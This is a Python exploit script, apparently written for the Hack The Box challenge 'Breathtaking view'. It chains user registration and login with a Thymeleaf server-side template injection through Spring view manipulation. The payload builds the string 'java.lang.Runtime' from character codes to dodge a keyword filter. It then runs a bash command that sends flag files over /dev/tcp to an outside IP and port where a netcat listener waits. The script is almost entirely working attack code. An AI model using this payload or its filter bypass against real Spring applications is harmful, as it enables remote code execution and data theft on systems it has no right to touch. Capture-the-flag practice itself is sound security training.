#!/usr/bin/env python3 
'''
Created this to solve the Hack The Box challenge called 'Breathtaking view'.  
This script exploits a server side template injection in Thymeleaf using 'Spring View Manipulation' to get rce. 
'''

import requests

target="94.237.54.201:53047" # update target ip
proxies= {"http":"http://127.0.0.1:8080"}
session= requests.Session()
data= {"username":"test2","password":"test2"}

# Register a user
response= session.post(url=f"http://{target}/register", proxies=proxies, data=data, allow_redirects=True)

# Login and get the cookie value 
response2= session.post(url=f"http://{target}/login", proxies=proxies, data=data, allow_redirects=True)

# This is needed in order to bypass a filter that blocks any payload containing the word java in it
payload = "java.lang.Runtime"
result = "true.toString().charAt(0).toChars(%d)[0].toString()" % ord(payload[0])
for i in range(1, len(payload)):
    result += ".concat(true.toString().charAt(0).toChars(%d)[0].toString())" % ord(payload[i])

params=f'lang=__${{true.getClass().forName({result}).getMethods()[6].invoke(true.getClass().forName({result})).exec(\'bash -c cat$IFS/flag*$IFS>%26$IFS/dev/tcp/54.227.158.166/4444 0>%261\')}}__::.x'  # update ip address and then set up nc listener

response3= session.get(url=f"http://{target}", params=params, proxies=proxies, allow_redirects=True)

print(response3.text)
